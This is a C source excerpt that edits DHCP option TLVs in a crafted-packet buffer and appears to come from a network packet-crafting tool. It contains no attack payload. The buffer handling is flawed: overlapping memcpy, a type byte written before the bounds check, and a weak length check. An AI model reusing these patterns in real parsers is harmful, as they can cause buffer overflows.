dhcp_edit_tlv(struct term_node *node, u_int8_t action, u_int8_t pointer, u_int16_t type, u_int8_t *value)
{
    u_int8_t i;
    u_int16_t len, offset;
    u_int32_t aux_long;
	struct dhcp_data *dhcp_data;

    i = 0;
    offset = 0;
    dhcp_data = (struct dhcp_data *) node->protocol[PROTO_DHCP].tmp_data;

	switch(action) {
		case TLV_DELETE:
			/* Find the TLV */
			while ((i < MAX_TLV) && (offset < dhcp_data->options_len)) {
				if ((*(u_int8_t *)(dhcp_data->options + offset + 1)) > dhcp_data->options_len) {
					write_log(0, "Oversized packet!\n");
					return -1; /* Oversized packet */
			    }

				if ((*(u_int8_t *)(dhcp_data->options + offset)) == LIBNET_DHCP_END)
					len = 1;
				else
			        len = (*(u_int8_t *)(dhcp_data->options + offset + 1)) + 2;

				if (i == pointer) {
					dhcp_data->options_len -= len;

					memcpy((void *)(dhcp_data->options + offset), (void *)(dhcp_data->options + offset + len),
							dhcp_data->options_len - offset);

					/* Space left in options should be zero */
					memset((void *)(dhcp_data->options + dhcp_data->options_len), 0, MAX_TLV*MAX_VALUE_LENGTH - dhcp_data->options_len);
					return 0;
				}

				i++;
				offset += len;
			}
		break;
		case TLV_ADD:
	    	dhcp_data->options[dhcp_data->options_len] = type;
			switch(type) {
				case LIBNET_DHCP_MESSAGETYPE:
					if (dhcp_data->options_len + 3 < MAX_TLV*MAX_VALUE_LENGTH) {
						dhcp_data->options[dhcp_data->options_len + 1] = 1;
						dhcp_data->options[dhcp_data->options_len + 2] = (*(u_int8_t *)value);
						dhcp_data->options_len += 3;
					} else
						return -1;
				break;
				case LIBNET_DHCP_END:
					if (dhcp_data->options_len + 1 < MAX_TLV*MAX_VALUE_LENGTH) {
						dhcp_data->options_len += 1;
					} else
						return -1;
				break;
				case LIBNET_DHCP_SUBNETMASK:
				case LIBNET_DHCP_ROUTER:
				case LIBNET_DHCP_DNS:
				case LIBNET_DHCP_DISCOVERADDR:
				case LIBNET_DHCP_SERVIDENT:
				    if (dhcp_data->options_len + 6 < MAX_TLV*MAX_VALUE_LENGTH) {
						dhcp_data->options[dhcp_data->options_len + 1] = 4;
						/*aux_long = htonl((*(u_int32_t *)value));*/
				        memcpy((void *)dhcp_data->options + dhcp_data->options_len + 2, (void *)value, 4);
					    dhcp_data->options_len += 6;
					} else
						return -1;
				break;
				case LIBNET_DHCP_HOSTNAME:
				case LIBNET_DHCP_DOMAINNAME:
				case LIBNET_DHCP_MESSAGE:
				case LIBNET_DHCP_CLASSSID:
				    len = strlen((char *)value);
					if (dhcp_data->options_len + len + 2 < MAX_TLV*MAX_VALUE_LENGTH) {
						dhcp_data->options[dhcp_data->options_len + 1] = len;
						memcpy((void *)dhcp_data->options + dhcp_data->options_len + 2, (void *)value, len);
						dhcp_data->options_len += len + 2;
					} else
						return -1;
				break;
				case LIBNET_DHCP_LEASETIME:
				case LIBNET_DHCP_RENEWTIME:
				case LIBNET_DHCP_REBINDTIME:
				    if (dhcp_data->options_len + 6 < MAX_TLV*MAX_VALUE_LENGTH) {
						dhcp_data->options[dhcp_data->options_len + 1] = 4;
						aux_long = htonl((*(u_int32_t *)value));
				        memcpy((void *)dhcp_data->options + dhcp_data->options_len + 2, (void *)&aux_long, 4);
					    dhcp_data->options_len += 6;
					} else
						return -1;
				break;
			}
		break;
	}

    return -1;
}


int8_t
dhcp_end(struct term_node *node)
{
   return 0;
}
